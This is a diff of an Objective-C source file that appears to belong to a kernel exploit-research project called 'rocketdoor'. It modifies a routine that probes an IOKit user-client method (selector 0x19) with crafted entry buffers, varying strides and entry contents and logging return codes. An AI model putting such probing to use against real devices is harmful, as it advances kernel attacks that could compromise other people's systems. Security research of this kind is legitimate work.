@@ -29,7 +29,7 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P143_BUILD @"p143-rocketdoor-v4-qidlaw"
+#define P143_BUILD @"p143-rocketdoor-v5-entrylaw"
 
 /* P069 no-header law: local prototypes only */
 typedef mach_port_t p_ioservice_t; typedef mach_port_t p_ioconnect_t;
@@ -167,21 +167,45 @@ static void p143_bandit(const char *outcome) {
         }
     }
     {
-        const uint32_t strides[4] = { 0x20, 0x28, 0x30, 0x40 };
-        for (int si = 0; si < 4; si++) {
+        /* v5 laws (agent-2 + the two boots' reply bytes):
+           - the entry content law: a REAL submission carries nonzero
+             entries ({+0x10 u64, +0x18 u64, +0x20 u32-gate}); zeroed
+             entries = the v4 row's remaining 2c2 candidate. The zero-
+             +0x10/+0x18 NQ law: +0x10 stays 0 (the p027 NQ safety law).
+           - the stride law: prefer the reply bytes' own pair — our
+             row-0 reply's +0x20 = 0x0000000200004000: the 0x4000 +
+             0x2 shape = a size/type class = a config echo candidate
+             (the stride law's own source = [q+0x530]+0x260). */
+        const uint32_t strides[6] = { 0x20, 0x28, 0x30, 0x40, 0x48,
+                                      0x00004000 };  /* the reply-byte shape */
+        const uint8_t contentRows = 2;   /* 0 = zero entry (the v4 row), 1 = real-content entry */
+        static uint8_t ent[0x40];
+        for (int si = 0; si < 6; si++) {
             if (ourQid == 0) { L(@"  no qid - the ladder skipped (honest)"); break; }
             uint32_t stride = strides[si];
-            static uint8_t ent[0x40]; memset(ent, 0, sizeof ent);
-            uint32_t cnt = 1;
-            uint64_t inS[4] = { ourQid, cnt, stride, 0 };
-            uint64_t out[2]; memset(out, 0, sizeof out);
-            uint32_t nout = 1;
-            kern_return_t kr = call(conn, 0x19, inS, 4, ent, cnt * stride,
-                                    out, &nout, NULL, NULL);
-            Lf(@"    submit qid=%llu count=1 stride=0x%x kr=0x%08x out0=%llu"
-               @"  (0 = CLEAN, 8 = the sub-fail sentinel)",
-               (unsigned long long)ourQid, stride, (unsigned)kr,
-               (unsigned long long)out[0]);
+            if (stride > sizeof(ent)) {
+                stride = (uint32_t)sizeof(ent);
+                Lf(@"    (stride capped to struct law: 0x%x)", stride);
+            }
+            for (int row = 0; row < contentRows; row++) {
+                memset(ent, 0, sizeof ent);
+                if (row == 1) {
+                    *(uint32_t *)(ent + 0x20) = 1;   /* the +0x20 gate law: NONZERO = the refresh path */
+                    *(uint64_t *)(ent + 0x18) = 0x1; /* the +0x18 datum (nonzero) */
+                    /* +0x10 stays 0 = the NQ safety law */
+                }
+                uint32_t cnt = 1;
+                uint64_t inS[4] = { ourQid, cnt, stride, 0 };
+                uint64_t out[2]; memset(out, 0, sizeof out);
+                uint32_t nout = 1;
+                kern_return_t kr = call(conn, 0x19, inS, 4, ent, cnt * stride,
+                                        out, &nout, NULL, NULL);
+                Lf(@"    submit qid=%llu count=1 stride=0x%x ent=%s kr=0x%08x"
+                   @" out0=%llu (0=CLEAN, 8=fail-sentinel)",
+                   (unsigned long long)ourQid, stride,
+                   row == 1 ? @"CONTENT" : @"zero", (unsigned)kr,
+                   (unsigned long long)out[0]);
+            }
         }
     }
     L(@"[3] the door's real gate = the INPUT shape: kind=4 + variable");
